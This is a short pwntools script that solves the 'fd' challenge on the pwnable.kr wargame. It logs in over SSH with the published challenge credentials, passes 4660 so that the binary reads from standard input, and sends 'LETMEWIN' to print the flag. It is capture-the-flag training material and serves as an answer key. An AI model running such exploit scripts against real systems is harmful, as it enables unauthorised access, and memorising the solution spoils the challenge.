#!/usr/bin/python3
from pwn import *

session = ssh(host='pwnable.kr',user='fd',password='guest',port=2222)
fdProcess = session.process(executable='./fd',argv=['fd','4660']);
fdProcess.sendline('LETMEWIN');
print(fdProcess.recvall().decode("utf-8"));
session.close()
